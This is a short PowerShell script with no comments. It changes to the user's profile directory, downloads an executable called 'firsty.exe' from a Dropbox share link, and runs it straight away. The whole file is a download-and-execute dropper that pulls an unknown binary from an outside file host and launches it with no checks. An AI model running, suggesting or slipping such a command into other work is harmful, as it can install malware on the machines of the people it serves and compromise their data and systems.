


cd $env:USERPROFILE


Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/q72l73er1ehnngz7i7lts/firsty.exe?rlkey=fbihnzvhsdd3zgc9szy2s2ck2&st=7254phb4&dl=1" -OutFile "$env:USERPROFILE\firsty.exe"
cd $env:USERPROFILE


& "$env:USERPROFILE\firsty.exe" 

